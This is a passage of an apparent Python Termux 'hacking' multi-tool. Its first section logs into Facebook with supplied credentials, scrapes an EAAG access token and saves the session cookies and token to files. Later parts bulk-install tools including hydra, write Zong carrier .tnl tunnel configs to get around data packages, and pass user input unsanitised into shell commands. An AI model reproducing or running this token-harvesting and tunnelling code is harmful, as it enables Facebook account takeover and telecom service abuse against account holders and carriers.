			"jazoest":re.search('name="jazoest" value="(.*?)"', str(r)).group(1),
				"m_ts":re.search('name="m_ts" value="(.*?)"', str(r)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(r)).group(1),
				"try_number":"0",
			"unrecognized_tries":"0",
				"prefill_contact_point":user,
			"prefill_source":"browser_dropdown",
				"prefill_type":"contact_point",
			"first_prefill_source":"browser_dropdown",
				"first_prefill_type":"contact_point",
			"had_cp_prefilled":True,
				"had_password_prefilled":False,
			"is_smart_lock":False,
				"bi_xrwh":"0",
			"__dyn":"",
				"__csr":"",
			"__req":"2",
				"__a":"",
			"__user":"0",
				"email":user,
			"encpass":"#PWD_BROWSER:0:"+real_time()+":"+pw
		}
		_ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", headers=_head2, data=payload)
		cok=_ses.cookies.get_dict()
		if 'c_user' in (cok):
			_head={
				'Host':'business.facebook.com',
					'cache-control':'max-age=0',
				'upgrade-insecure-requests':'1',
					'user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36',
				'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
					'content-type' : 'text/html; charset=utf-8',
				'accept-encoding':'gzip, deflate',
					'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
			}    
			_r=_ses.get(urls, headers=_head)
			_p=re.search('(EAAG\w+)', _r.text)
			_token=_p.group(1)
			if 'EAA' in _token:
				print('\n[*] Cookie : '+convert(cok))
				open("cookie.txt", 'a').write(convert(cok))
				print('\n[*] Token  : '+_token )
				open("token.txt", 'a').write(_token)
				print('')
				exit()
		elif 'checkpoint' in (cok):
			exit('[*] Your Account Is On Check-Point ')
		else:
			print('\n[*] Wrong Username Or Password ')
			time.sleep(3)
			fb()
	except AttributeError:
		print('\n[*] Wrong Username Or Password')
		time.sleep(3)
		fb()



def grep():
	logo()
	print("[*] Enter Separate Object Find In File - Example ");time.sleep(0.3)
	print("[*] 100077  -  100078  -  100079  -  100080  -  100081 ");time.sleep(0.3)
	print("[*] 1000  -  10000  -  100000  -  1000000  -   1000000 \n\n ");time.sleep(0.3)
	g = input('\033[0;97m[->] Separate : ')
	f = input('\033[0;97m[->] File Path : ')
	o = input('\033[0;97m[->] Save As : ')
	os.system('touch ' +o)
	os.system('cat '+f+' | grep '+g+' > ' +o)
	print("")
	print("")
	print(linesmall)
	print("[*] Separating Successful \n [*] Separate " + g + " From " + f )
	print("[*] New File Save " + o)
	print(linesmall)
	print("\n\n")
	time.sleep(2)
def basic_termux():
	logo();print("[*] Termux Permission Allow Notification  ");os.system("termux-setup-storage");print("[*]  Updating All Install Packages  ");os.system("pkg update && pkg upgrade");print("[*] Installing Python  ");os.system("pkg install python -y");print("[*] Installing Python 2  ");os.system("pkg install python2 -y");print("[*] Installing Python 3  ");os.system("pkg install python3 -y");print("[*] Installing Python-Pip  ");os.system("pkg install python-pip");print("[*] Installing Wget ");os.system("pkg install wget -y");print("[*] Installing Fish  ");os.system("pkg install fish -y");print("[*] Installing Ruby  ");os.system("pkg install ruby -y");print("[*] Installing Termux Help  ");os.system("pkg install help -y");print("[*] Installing Git  ");os.system("pkg install git -y");print("[*] Installing Dnsutils  ");os.system("pkg install dnsutils -y");print("[*] Installing Php  ");os.system("pkg install php -y");print("[*] Installing Perl  ");os.system("pkg install perl -y");print("[*] Installing Lua  ");os.system("pkg install lua -y");print("[*] Installing Parallel  ");os.system("pkg install parallel -y");print("[*] Installing Nmap  ");os.system("pkg install nmap -y");print("[*] Installing Bash  ");os.system("pkg install bash -y");print("[*] Installing Clang  ");os.system("pkg install clang -y");print("[*] Installing Nano  ");os.system("pkg install nano -y");print("[*] Installing W3M  ");os.system("pkg install w3m -y");print("[*] Installing Hydra  ");os.system("pkg install hydra -y");print("[*] Installing Figlet  ");os.system("pkg install figlet -y");print("[*] Installing Cowsay  ");os.system("pkg install cowsay -y");print("[*] Installing Curl  ");os.system("pkg install curl -y");print("[*] Installing Tar  ");os.system("pkg install tar -y");print("[*] Installing Zip  ");os.system("pkg install zip -y");print("[*] Installing Unzip  ");os.system("pkg install unzip -y");print("[*] Installing Net-Tool  ");os.system("pkg install net-tools -y");print("[*] Installing Tor  ");os.system("pkg install tor -y");print("[*] Installing Sudo  ");os.system("pkg install sudo -y");print("[*] Installing WireShark  ");os.system("pkg install wireshark -y");print("[*] Installing Wgetrc  ");os.system("pkg install wgetrc -y");print("[*] Installing Wcalc  ");os.system("pkg install wcalc -y");print("[*] Installing OpenSSL  ");os.system("pkg install openssl -y");print("[*] Installing OpenSSL Tool  ");os.system("pkg install openssl-tool -y");print("[*] Installing Bmon  ");os.system("pkg install bmon -y");print("[*] Installing VPN  ");os.system("pkg install vpn -y");print("[*] Installing  Toilet  ");os.system("pkg install toilet -y");print("[*] Installing Unrar ");os.system("pkg install unrar -y");print("[*] Installing Proot ");os.system("pkg install proot -y");print("[*] Installing  Net-Toots ");os.system("pkg install net-tools -y");print("[*] Installing  Vem");os.system("pkg install vim -y");print("[*] Installing Ired ");os.system("pkg install ired -y");print("[*] Installing Php ");os.system("pip install php && pip2 install php");print("[*] Installing Mechanize ");os.system("pip install mechanize && pip2 install mechanize");print("[*] Installing Requests ");os.system("pip2 install requests && pip install requests");print("[*] Installing FakeRoot ");os.system("pkg install fakeroot -y");print("[*] Installing Bs4 ");os.system("pip install bs4 && pip2 install bas4");print("\n\n[*] Done :) ")
def enc():
	logo()
	print("[01]  ");time.sleep(0.3)
	print("[02] ");time.sleep(0.3)
	print("[03]  ");time.sleep(0.3)
	print("[04]  ");time.sleep(0.3)
	print("[05]  ");time.sleep(0.3)
	print("[06] ");time.sleep(0.3)
	print("[07]  ");time.sleep(0.3)
	print("[08]  ");time.sleep(0.3)
	print("[09]  ");time.sleep(0.3)
	print("[10] ");time.sleep(0.3)
	print("[11]  ");time.sleep(0.3)
	print("[12]  ");time.sleep(0.3)
	print("[13]  ");time.sleep(0.3)
	print("[14]  ");time.sleep(0.3)
	print("[15]  ");time.sleep(0.3)
	print("[16]  ");time.sleep(0.3)
	print("[17]  ");time.sleep(0.3)
	print("[18]  ");time.sleep(0.3)
	print("[19]  ");time.sleep(0.3)
	print("[20]  \n");time.sleep(0.3)
def download_ua():
	logo()
	os.system("rm -rf user_agent.txt")
	os.system("rm -rf /sdcard/UserAgent_2613_File/")
	os.system("wget https://raw.githubusercontent.com/Bilal-XD/Github-Data/main/user_agent.txt ")
	os.system("mkdir /sdcard/UserAgent_2613_File")
	os.system("mv user_agent.txt /sdcard/UserAgent_2613_File/")
	exit("\n\n[*] User-Agents File Downloading Successful\n[*] File Save As /sdcard/UserAgent_2613_File/ \n[*] 2613 User-Agents For One-Tap \n\n")
	
def dec():
	logo()
	print("[01] Method Decode Marshal Script - V1 ");time.sleep(0.3)
	print("[02] ");time.sleep(0.3)
	print("[03]  ");time.sleep(0.3)
	print("[04]  ");time.sleep(0.3)
	print("[05]  ");time.sleep(0.3)
	print("[06] ");time.sleep(0.3)
	print("[07]  ");time.sleep(0.3)
	print("[08]  ");time.sleep(0.3)
	print("[09]  ");time.sleep(0.3)
	print("[10] ");time.sleep(0.3)
	print("[11]  ");time.sleep(0.3)
	print("[12]  ");time.sleep(0.3)
	print("[13]  ");time.sleep(0.3)
	print("[14]  ");time.sleep(0.3)
	print("[15]  ");time.sleep(0.3)
	print("[16]  ");time.sleep(0.3)
	print("[17]  ");time.sleep(0.3)
	print("[18]  ");time.sleep(0.3)
	print("[19]  ");time.sleep(0.3)
	print("[20]  \n");time.sleep(0.3)
	decx = input("[*] Choose : ")
	if decx == '1' or decx == '01':
		logo()
		print("[*] Method Decoding Marshal Dec Simple Script ")
		print("[*] First Open Encoded Script In Termux nano Code Editor")
		print("[*] Then Change 'exec' to 'e=' After That Add Decoding Code")
		print("[*] Aftet That Press CTRL + X to Save Script ")
		print("[*] Then Run Script Using Python2 or Python3 ")
		print("[*] New Dedcoded Script Save As marshal_dec.py ")
		print("[*] Decoding Code : ")
		print("")
		print("from uncompyle6.main import decompile as Bilal")
		print("Bilal(2.7,e,open('marshal_dec.py','w'))")
		exit("\n\n")

		
def tnl():
	logo()
	print("[01]  ");time.sleep(0.3)
	print("[02] Download Zong .tnl File [ Fast ]");time.sleep(0.3)
	print("[03] Download Zong .tnl File [ Super Fast ] ");time.sleep(0.3)
	print("[04]  ");time.sleep(0.3)
	print("[05]  \n");time.sleep(0.3)
	tnlx = input("[>] Choose : ")
	if tnlx == '' or tnlx == ' ':
		tnl()
	elif tnlx =='1' or tnlx == '01':
		print("")
	elif tnlx =='2' or tnlx == '02':
		os.system("rm -rf /sdcard/Zong_TNL")
		os.system("mkdir /sdcard/Zong_TNL")
		szf = open('/sdcard/Zong_TNL/Zong_WhatsappHost_Internt.tnl', 'w')
		szf.write(wa_zong_free)
		szf.close()
		time.sleep(1)
		line_chack_dote()
		time.sleep(1)
		print("\n[*] Creating File Successful ")
		time.sleep(1.5)
		jalan("\n\n[*] Download Open Tennel App From Google Playstore or From Google Chrome ");time.sleep(0.05)
		jalan("[*] Open Open Tennel App And Import .tnl file From /sdcard/Zong_TNL ");time.sleep(0.05)
		jalan("[*] It's not Work If You Don't Have Any Zong Social Package ");time.sleep(0.05)
		jalan("[*] Like : Zong Whatsapp Internet Package or Zong Internet Facebook Package ");time.sleep(0.05)
		jalan("[*] After That If .tnl File Does not Work Chack Zong APN ");time.sleep(0.05)
		jalan("[*] APN Stang From : Access Point Name ");time.sleep(0.05)
		jalan("[*] Create Some New APN With New Host ");time.sleep(0.05)
		jalan("[*] Host Whatsapp : https://web.whatsapp.com ");time.sleep(0.05)
		jalan("[*] Host Facebook : https://m.facebook.com ");time.sleep(0.05)
		exit("")
	elif tnlx == '3' or tnlx == '03':
		os.system("rm -rf /sdcard/Zong_TNL_Pto")
		os.system("mkdir /sdcard/Zong_TNL_Pro")
		szf = open('/sdcard/Zong_TNL_Pro/Zong_WhatsappHost_Internt.tnl', 'w')
		szf.write(wa_zong_free_pro)
		szf.close()
		time.sleep(1)
		line_chack_dote()
		time.sleep(1)
		print("\n[*] Creating File Successful ")
		time.sleep(1.5)
		jalan("\n\n[*] Download Open Tennel App From Google Playstore or From Google Chrome ");time.sleep(0.05)
		jalan("[*] Open Open Tennel App And Import .tnl file From /sdcard/Zong_TNL_Pro ");time.sleep(0.05)
		jalan("[*] It's not Work If You Don't Have Any Zong Social Package ");time.sleep(0.05)
		jalan("[*] Like : Zong Whatsapp Internet Package or Zong Internet Facebook Package ");time.sleep(0.05)
		jalan("[*] After That If .tnl File Does not Work Chack Zong APN ");time.sleep(0.05)
		jalan("[*] APN Stang From : Access Point Name ");time.sleep(0.05)
		jalan("[*] Create Some New APN With New Host ");time.sleep(0.05)
		jalan("[*] Host Whatsapp : https://web.whatsapp.com ");time.sleep(0.05)
		jalan("[*] Host Facebook : https://m.facebook.com ");time.sleep(0.05)
		exit("")
def kali():
	logo()
	print("[01] Download Kali Bare Mental ");time.sleep(0.3)
	print("[02] Download Kali Virtual Machine ");time.sleep(0.3)
	print("[03] Download Kali ARM ");time.sleep(0.3)
	print("[04] Download Kali NetHunter ");time.sleep(0.3)
	print("[05] Download Kali Bot ISO && Live ");time.sleep(0.3)
	print("[06] Download Kali Customize Tool ");time.sleep(0.3)
	print("[07] Download Kali Help && Method ");time.sleep(0.3)
	love_kali = input("\n[*] Choose : ")
	if love_kali == '1' or love_kali == '01':
		os.system("xdg-open https://www.kali.org/get-kali/#kali-bare-metal")
		exit("\n\n")
	elif love_kali == '2' or love_kali == '02':
		os.system("xdg-open https://www.kali.org/get-kali/#kali-virtual-machines")
		exit("\n\n")
	elif love_kali == '3' or love_kali == '03':
		os.system("xdg-open https://www.kali.org/get-kali/#kali-arm")
		exit("\n\n")
	elif love_kali == '4' or love_kali == '04':
		os.system("xdg-open https://www.kali.org/get-kali/#kali-mobile")
		exit("\n\n")
	elif love_kali == '5' or love_kali == '05':
		os.system("xdg-open https://www.kali.org/get-kali/#kali-live")
		exit("\n\n")
	elif love_kali == '6' or love_kali == '06':
		os.system("xdg-open https://www.kali.org/tools/")
		exit("\n\n")
	elif love_kali == '7' or love_kali == '07':
		os.system("xdg-open https://www.kali.org/docs/")
		exit("\n\n")
	else:
		kali()
def dupcutter():
	logo()
	print("[*] File Duplicate Object Cutter - Auto Object ")
	print("[*] Enter File Path / File Location  \n\n")
	bilal = input('[->] File Path   : ')
	haider = input('[->] New File Save As : ')
	os.system('touch ' +haider)
	os.system('sort -r '+bilal+' | uniq > '+haider)
	print("")
	print("")
	print(linesmall)
	print("[*] Removing Successful  From File " + bilal )
	print("[*] New File Save " + haider )
	print(linesmall)
	print("\n\n")
	time.sleep(2)
def approv():
	os.system("clear")
	idx = open('/data/data/com.termux/files/usr/bin/.NoName.txt', 'r').read()
	if idx in server:
		help()
	else:
		logo();time.sleep(0.3)
		print("[*] Sorry Bro, Your Key Is Not Approved Now ");time.sleep(0.3)
		print("[*] Copy Your Key And Send To The Tool Owner ");time.sleep(0.3)
		print("[*] Tool \x1b[1;91mNoName\x1b[1;97m Is Not Paid But Just Need Approval To Use It ");time.sleep(0.3)
		print("\n\n[*] Your Key : " + idx + "\n\n");time.sleep(0.3)
		exit(' ')
def window():
	logo()
	print("[01] Download Window 10 ISO File [ 32 & 64 ] ");time.sleep(0.3)
	print("[02] Download Window 8.1 ISO File [ 32 & 64  ] ");time.sleep(0.3)
	print("[03] Download Window 7 ISO File [ 32 & 64  ] ");time.sleep(0.3)
	print("[04] Download Window 11 ISO File [ 32 & 64  ] ");time.sleep(0.3)
	wind = input("\n[*] Choose : ")
	if wind == '1' or wind == '01':
		os.system("xdg-open https://www.microsoft.com/en-us/software-download/windows10ISO")
		exit("\n\n")
	elif wind == '2' or wind == '02':
		os.system("xdg-open https://www.microsoft.com/en-us/software-download/windows8ISO")
		exit("\n\n")
	elif wind == '3' or wind == '03':
		os.system("xdg-open https://tech-latest.com/download-windows-7-iso/")
		exit("\n\n")
	elif wind == '4' or wind == '04':
		os.system("xdg-open https://www.microsoft.com/software-download/windows11")
		exit("\n\n")
	elif wind == '1' or wind == '01':
		os.system("xdg-open ")
		exit("\n\n")
	elif wind == '1' or wind == '01':
		os.system("xdg-open ")
		exit("\n\n")
	else:
		help()
if len(sys.argv) == 2:
	if sys.argv[1] == "--info" or sys.argv[1] == "-info":
		logo()
		time.sleep(0.5)
		print("[*] About : Master Multi Functional Script - All About Hacking ");time.sleep(0.3)
		print("[*] Created By : Bilal Haider ID ");time.sleep(0.3)
		print("[*] Tool Name : \x1b[1;91mNoName\x1b[1;97m ");time.sleep(0.3)
		print("[*] Team : CodeX-ID ");time.sleep(0.3)
		print("[*] My Github : https://github.com/Bilal-XD/");time.sleep(0.3)
		print("[*] Team Github : https://github.com/CodeX-ID/");time.sleep(0.3)
		print("[*] Copyright : \x1b[1;97mNo Copyright Issue\x1b[1;97m");time.sleep(0.3)
		print("[*] Gmail : bilalhaiderofficial007@gmail.com");time.sleep(0.3)
		print("[*] Host / Port : 127.0.0.1 / 8080  ");time.sleep(0.3)
		print("[*] Whatsapp : +923440157745 ");time.sleep(0.3)
		print("[*] Facebook : Bilal Haider ID ");time.sleep(0.3)
		print("[*] Premium : \x1b[1;92mFree Tool Not Premium \x1b[1;97m");time.sleep(0.3)
		print("[*] Approval : First Take Approval To Use Script ");time.sleep(0.3)
		print("[*] Exemple Key : XXXXXXX-YYYYYYY-ZZZZZZZ  ");time.sleep(0.3)
		print("[*] Today Date : " + alldatex);time.sleep(0.3)
		print("[*] Programming Language : Python ");time.sleep(0.3)
		print("[*] Tool Language : English  ");time.sleep(0.3)
		print("[*]  ");time.sleep(0.3)
		print("[*]  ");time.sleep(0.3)
		print("[*]  ");time.sleep(0.3)
		print("[*]  ");time.sleep(0.3)
		print("[*]  ");time.sleep(0.3)
		print("[*]  ");time.sleep(0.3)
		print("[*]  ");time.sleep(0.3)
		exit("")
	elif sys.argv[1] == "--help" or sys.argv[1] == "-help":
		help()
	elif sys.argv[1] == "--kali" or sys.argv[1] == "-kali":
		kali()
	elif sys.argv[1] == "-update" or sys.argv[1] == "--update":    
		os.system("git pull")
		exit("")
	elif sys.argv[1] == "-window" or sys.argv[1] == "--window":
		window()
	elif sys.argv[1] == "-termux" or sys.argv[1] == "--termux":
		logo()
		print("[01] Download Termux Version 0.22 [ 134.8 KB ]");time.sleep(0.3)
		print("[02] Download Termux Version 0.27 [ 142.0 KB ] ");time.sleep(0.3)
		print("[03] Download Termux Version 0.39 [ 196.1 KB ] ");time.sleep(0.3)
		print("[04] Download Termux Version 0.52 [ 172.4 KB ] ");time.sleep(0.3)
		print("[05] Download Termux Version 0.54 [ 207.9 KB ] ");time.sleep(0.3)
		print("[06] Download Termux Version 0.55 [ 207.6 KB ] ");time.sleep(0.3)
		print("[07] Download Termux Version 0.56 [ 220.1 KB ] ");time.sleep(0.3)
		print("[08] Download Termux Version 0.57 [ 219.2 KB ] ");time.sleep(0.3)
		print("[09] Download Termux Version 0.59 [ 217.8 KB ] ");time.sleep(0.3)
		print("[10] Download Termux Version 0.60 [ 217.9 KB ] ");time.sleep(0.3)
		print("[11] Download Termux Version 0.61 [ 219.5 KB ] ");time.sleep(0.3)
		print("[12] Download Termux Version 0.62 [ 221.0 KB ] ");time.sleep(0.3)
		print("[13] Download Termux Version 0.63 [ 220.9 KB ] ");time.sleep(0.3)
		print("[14] Download Termux Version 0.64 [ 221.2 KB ] ");time.sleep(0.3)
		print("[15] Download Termux Version 0.65 [ 225.1 KB ] ");time.sleep(0.3)
		print("[16] Download Termux Version 0.66 [ 214.7 KB ] ");time.sleep(0.3)
		print("[17] Download Termux Version 0.67 [ 215.9 KB ] ");time.sleep(0.3)
		print("[18] Download Termux Version 0.68 [ 205.9 KB ] ");time.sleep(0.3)
		print("[19] Download Termux Version 0.69 [ 209.9 KB ] ");time.sleep(0.3)
		print("[20] Download Termux Version 0.70 [ 209.5 KB ] ");time.sleep(0.3)
		print("[21] Download Termux Version 0.71 [ 209.4 KB ] ");time.sleep(0.3)
		print("[22] Download Termux Version 0.72 [ 209.4 KB ] ");time.sleep(0.3)
		print("[23] Download Termux Version 0.73 [ 210.2 KB ] ");time.sleep(0.3)
		print("[24] Download Termux Version 0.83 [ 165.5 KB ] ");time.sleep(0.3)
		print("[25] Download Termux Version 0.95 [ 68.0 MB ] ");time.sleep(0.3)
		print("[26] Download Termux Version 0.98 [ 69.1 MB ] ");time.sleep(0.3)
		print("[27] Download Termux Version 0.99 [ 69.4 MB ] ");time.sleep(0.3)
		print("[28] Download Termux Version 0.101 [ 69.5 MB ] ");time.sleep(0.3)
		print("[29] Download Termux Version 0.103 [ 84.8 MB ] ");time.sleep(0.3)
		print("[30] Download Termux Version 0.117 [ 81.8 MB ] ");time.sleep(0.3)
		print("[31] Download Termux Version 0.118 [ 97.0 MB ] ");time.sleep(0.3)
		termx = input("\n[*] Choose : ")
		if termx == '1' or termx == '01':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcdxsPCLqN7Jvyabuxbed1pJpRCSwnuyKIbpLVYG73WxEZhVEdhRpVtgeJUlrOeCUSnH3nfST74kJJac84mAobwS/pu1xR0lYwI7c3fVxgHaimvc42zhgxZUsD-6GeeFuszEHXCU4Fnb5c0r5WVAXol-2FbFtHV6RPUNDF6_gFgp5O04Qq9JhmSqZkJGRDeTdQQpttfeZjrIzzSaDwVbWXQ62/s3Fg4gz-gb--a24GmGhvLsmGxSNsaroZMX4wGIkxzT1xP1HX7Nf5jT1R_kz8jAM1/")
			exit("\n\n")
		elif termx == '2' or termx == '02':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcfZ65frD3At9BnHVn_sxrl3u9UtAOu6wH8IjsVGUA6bj6bh-e_riWA5RcgyvQh9ZXw5CxVysSOR20w1Y1fXrF2c/6O-1OXpAWcqVX7IQh7y4RXD9ZOQu5fTX4rQKgaOS3Ixfxnxq6ZGrzs88O6-N4DgCqZGKEmmjXq8s6Cp7F1RfABEDtcaLjcnszTNw3et-4CQ-Axi5EstSZ3tnVPn21PWq/YHd_sXmm9qIcE5KB8ng3-XQK66wK1br0IK83SMJtCQ9wumQQORKJqDtqt7i0Wa9U/")
			exit("\n\n")
		elif termx == '3' or termx == '03':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTccnFOUpb1y9UtJ70hTDAdT_fRA2U9yqo9oUfN9OmDXues67izgjo6zOOQXEb_NzgOXM4GNFwqTWjukErrh--wEG/mnyM7Zn-cawi51jtLLN8MPJSeM1_B7njWtuGtkfjSF87rloWZ4X-fy8wTsviQbD4CyJX9j7e-zPFAmHnPdiQ1QSqeEipl3KurhRS8d2i4xzm9BfrckHrsg6p5QTqtHA5/nrGsBCObMF77FGy9MSShf2CGUL_Oh6mAVo40vGZ_1fq_2oNH079DojgCaNRG5_XZ/")
			exit("\n\n")
		elif termx == '4' or termx == '04':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTceIGgyPgS_869klVlnbSgIwotXsYsS5ciGEoBy02aBMYYqYtgcXlJvcGn4HN9Lru5XBskxbjgf-ffDfsX5K8EZ2/cW843T7MTlLq8MBtfEpgUyUsbiST3iqvXF-4cvd9kI3xBttlDLchxaXpxVPXqXaau8S1FQIqoqwMkPSk0Y6f2V0E4Rrorci54EV-Q5W4I32JEPCTVV19DR5X0WEdtGlM/uZ4ql90pajb1YV8gT89cjew8KD_t4gQsWgeFkAcXC5vcGYBrviNYbibjz7-U1IWc/")
			exit("\n\n")
		elif termx == '5' or termx == '05':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTccfk3ZJ4_aZksVG_wZNmtuNYXXJjBxpP-8_0F31DxkwH1LJPWrLViIvt4HuxgLQ4pwKClZJV1vP4W-19wanrOcN/ZlSQCDhmRlR0tTh37AMltZU_JUrZwbJ7knHJ_q1p-AwGCvBVGA_SxLnsBugaFdqDCwZnKx9LiOclVTRUZCFsveNhVYQMP8DQS1X35NrO5lJ9F7YA6kRuDi-I43Nj4dZf/o8wTixCim25fO-AqqZ5tMavAm6A0_HxA8LvXE-JHzV4Y66jxS07MvR9hM7K-ZCgD/")
			exit("\n\n")
		elif termx == '6' or termx == '06':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTccOOAtIUHrchxV7vAl9LprnVDZcdRAfo55O1t6b2rnzegDGKHmFWQBn--XQmVSDyA4HgTCdYFG9TU8FlrS8IFmK/3sT4UPIvAELdp20va3f1cwMf595okVKxeyOqMpR4hSjyN5EYLFGGRqW4FG_0VX3s28wrn9kGp-FSEGx0ZFq_DeRuSqo4bTWZ86R5WyeRDFzfZr4PG3ugTGDdITAvc20g/FLHQuYy84y_YaHu2dOt2wkabiUy4_T63LJOBvsdz3jS1vb_8Y0NhkuIerpJ8WxNg/")
			exit("\n\n")
		elif termx == '7' or termx == '07':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTce9AwJqNv2RGGD48Iskf4rnEi5d68FCvdZ6nhmgWl1fZUvaNo-aPqj6szL6OMYiqgO-MQJYcAEOOqwIAMvdzCWU/a4f3uMg3qmVTGz_kC-Xy_nZ9v3ETgRd1RmwY29GapJH__R5JL2re37WsowrOuicc5nOqNDcF8G0A_fQdNksAPu0ofCozUytmMT2-Mx-mO1sRaExu11MowVVRlpa5zcse/LWgya0qvwx9sQ3mbvBuqc59r3AydZzHVMuBmjwlXhX4XIQ62JuPmh2AaKtrfbaed/")
			exit("\n\n")
		elif termx == '8' or termx == '08':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTccQ_WQZLMbzeMkLP3CV9XXdX-Z57p9tV-1qufcmqL0HSKkwvS24Dn9ScBXkENsxey6C1Q4RUCYQdGIsdAWyVp1d/4WYmjgh8KUS90hjwwI-bkeY_k4ZMyWDipU_79OAzFz-Al3efD61pHwMIEP_7nk17AnwC8whaso_0gcrdeeqdpcKJfTySlCJ4HoS1ImZNoNnCLQeVffTVofymAyXaRsko/BSz16ubJuJlrb6wzZ50kvDWj34o633LuXwYZPfS___2Xe8Gjk73aKA2kH-xXX0Tk/")
			exit("\n\n")
		elif termx == '9' or termx == '09':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcd50FR6LtKlLEx_Y6_k4S5Y-gDkpaKugHLIYanOyy_UYwqoKsUlhjqzkxFTey7wTBwVYWo8OmBHOSJIaQsMyqu2/KjWD-05mryNGmROuajVDN2Nocznnj0JujYTE7d3oQPgP2OLXt8E3XV6FTH6eJkppby5PGNyTo8f5MUuQFjW4tOyUOjGG67NmCV7R1voCSqaecLft4cZEuEDRgTp2ZNGH/6PpSf5vMuDtk2gYaJfzAjKWR0oShtqISyTOF6-sE6RdfB0b8H9FDUq0Kw43tQOHC/")
			exit("\n\n")
		elif termx == '10':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcfNKiijG50Ff_8Z-suAJKO8mv2370ppqtRCNE01uo2O0-jNZqepF-N6TtSqiJRPShPAZ6LZKeYKtrchvzj7qkLP/DSSwQqO7xFHkc0-IhhBfqEw9WstIIMEXArBdx0tfMuGkSkxg-siAIfFWzqjr2mYDJCsPmLNJ8hh14JcgFG5mpRlgQ4sxd490Y327DThRN7iknGL09pGLsQpK2M_6BQ9h/j1R_aacogbcHWaBuFLnJ2MZ_lxNauiNVzS-nMch6j5WhAVWvoq43s-WhY2dBDHIc/")
			exit("\n\n")
		elif termx == '11':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcdy8O_RiGlS7LT2cZGekesor8kJ0a_tbeXVj8FN0Z3aMwNHNSqOaHiaVl0nccjpwrk3eD57bQ5OCk_hQ6BLfesK/VVdf3dY4MI_-BwzEaJ0SSZL4_UdsFmPMltF7ZrRLq37KyxOIMKB-f87XK8PFPSYaKEK0dh0A3aZzMUempbAUff2fkdF5NYRP_h4EGgIqzvrj9U4Arx-BjOVQPXfNe9Yv/-Z71xOwMQgKFFlPLARK1n0qMtgpo_IhhK2kspvAiZpsUzsNijHMKvnQc4FR-D0tM/")
			exit("\n\n")
		elif termx == '12':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTce0FANL7w3oRwPJpXx54crFgbSAt9nqOz7ygjFZ0FfeXvEtgEo4NQtpCYw2rXJiTxWtNlJIq_a8bI3EhnMzFNhd/4CaCPP_Q3I0R670YD_aLSPZ97ThFQAbzA-ZqbeXUOvjFaefhXj6nSIbBpuLzmMZWcx0qVTzzOJigXswlzNZILsSN0QZ5sEgZ_WHPQ9gWKXedb3hlpSjv3OPiwFgUtrGq/tD3WDg8ey5VAmmxMG37bbNHyi5Bt3xBjqdgjv5caTAzA2Owlh0S5E_CaCzVB6_Vx/")
			exit("\n\n")
		elif termx == '13':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcehlWO_TukoXntJET1QK-HT479Lf6JbKCj664eGXhC6Spcjp8bvSBj4IwnmVakI2ocbLP87HcN62L5ZldZNy5MQ/Y0TKQtTQVR0axFxt9ZEWpCuyspEh0qKnT5xuU9VmK2J3HnKd_g5jGspAXvKdxkGrUhDhONbgJ_wf_GvlM2pUUl2DroE9lA42W1YYEnAz91n2kSTBPbvGaVVmFO0gZPwJ/ZNFuLE_WYQOvX-3dcsbNf--6utwPjiJH2gYRYatDPdcxG35fomwajyN259iiPXJU/")
			exit("\n\n")
		elif termx == '14':
			os.system("xdg-open https://dw.uptodown.com/dwn/KoUYI624XRhpY3JUn0eXyfzyfCBdJAE6qmNQ6-wlTcezeqS2inCejhb1LPtGExPjAbaXOw0WJO-rF6Cfw3u7NC0NbMy9JncpqO03__pdXkUILf5WDkRINMAYdvI4nSzI/HbXdEyba8x5P8v-O4Z7vAQRN2ung5QS8K8Xy0SSQVYdsgbz0ogzuUtibaJNl19fT-QhHBeBHQV75gcsrflCxai9x9WYkkDpNy2qcX7_tALWt9RsqT0fhcWcODxtkMYod/L9_pG9V4LQxG07G5TQP1joxCCU8b4K9G57A5LerPDZJ0MOpiugUieq_gC9VBj-CD/")
			exit("\n\n")
		elif termx == '15':
